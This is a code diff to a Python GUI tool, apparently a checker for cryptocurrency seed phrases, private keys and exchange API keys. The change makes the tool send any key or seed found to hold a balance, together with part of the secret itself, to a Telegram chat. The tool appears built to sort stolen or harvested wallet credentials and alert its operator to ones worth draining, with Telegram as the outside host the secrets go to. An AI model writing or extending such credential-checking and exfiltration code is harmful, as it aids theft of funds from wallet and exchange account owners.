@@ -956,10 +956,22 @@ class MultiCheckerApp(ctk.CTk):
         # Feature 7 — Telegram notifications for high-value results
         for r in self.results:
             est = self._estimate_usd(r)
-            if est > 100:
+            rtype = r.get("type", "")
+            # Seed/privkey with ANY balance → notify; wallets only if > $100
+            notify_threshold = 0 if rtype in ("seed", "privkey_hex", "privkey_wif", "exchange_api") else 100
+            if est > notify_threshold:
                 inp = r.get("input", "")[:30]
                 msg_text = r.get("info", {}).get("message", "")
-                tg_msg = f"<b>💰 Balance found!</b>\n{inp}\n{msg_text[:200]}\nUSD: ~${est:,.2f}"
+                if rtype == "seed":
+                    tg_msg = f"<b>🌱 Seed Phrase with balance!</b>\n<code>{inp}</code>\n{msg_text[:200]}\nUSD: ~${est:,.2f}"
+                elif rtype == "privkey_hex":
+                    tg_msg = f"<b>🔑 Private Key with balance!</b>\n<code>{inp}</code>\n{msg_text[:200]}\nUSD: ~${est:,.2f}"
+                elif rtype == "privkey_wif":
+                    tg_msg = f"<b>🔑 WIF Key with balance!</b>\n<code>{inp}</code>\n{msg_text[:200]}\nUSD: ~${est:,.2f}"
+                elif rtype == "exchange_api":
+                    tg_msg = f"<b>🏦 Exchange API key!</b>\n{inp}\n{msg_text[:200]}"
+                else:
+                    tg_msg = f"<b>💰 Balance found!</b>\n{inp}\n{msg_text[:200]}\nUSD: ~${est:,.2f}"
                 self._notify_telegram(w, tg_msg)
 
         # Feature 6 — Summary line: accounts with balance and total portfolio
